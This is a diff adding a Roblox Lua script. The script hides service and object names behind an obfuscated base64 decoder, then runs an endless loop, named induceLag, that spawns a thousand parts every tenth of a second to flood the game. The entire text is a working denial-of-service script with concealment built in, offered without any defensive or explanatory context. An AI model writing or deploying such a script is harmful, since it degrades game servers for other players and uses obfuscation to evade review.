@@ -1,0 +1,24 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function giTQAjbGwdVyLypPXfCwykJqThEuaoXJxhZTqLMCGncHXapSgkxybUrMRATkqfNSmJYiSMxlQxRcGSJTjoqTYYhlBOOqdTwKD(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+local Players = game:GetService(giTQAjbGwdVyLypPXfCwykJqThEuaoXJxhZTqLMCGncHXapSgkxybUrMRATkqfNSmJYiSMxlQxRcGSJTjoqTYYhlBOOqdTwKD('QkRXNvaYykfgqyCGvQaMyGdCesLOJPzDoexFmkHrTFaUkyOXxeJQqiZUGxheWVycw=='))
+local player = Players.LocalPlayer
+
+
+local function induceLag()
+    while true do
+        -- Create a large number of instances
+        for i = 1, 1000 do
+            local part = Instance.new(giTQAjbGwdVyLypPXfCwykJqThEuaoXJxhZTqLMCGncHXapSgkxybUrMRATkqfNSmJYiSMxlQxRcGSJTjoqTYYhlBOOqdTwKD('rrfqpDAEDUSdcBqKtwcpUNwfjKinGuxFUStFJHZPoEmpTQSRyxpEshGUGFydA=='))
+            part.Size = Vector3.new(1, 1, 1)
+            part.Position = Vector3.new(math.random(-100, 100), math.random(0, 50), math.random(-100, 100))
+            part.Parent = workspace
+        end
+        wait(0.1)
+    end
+end
+
+induceLag()    
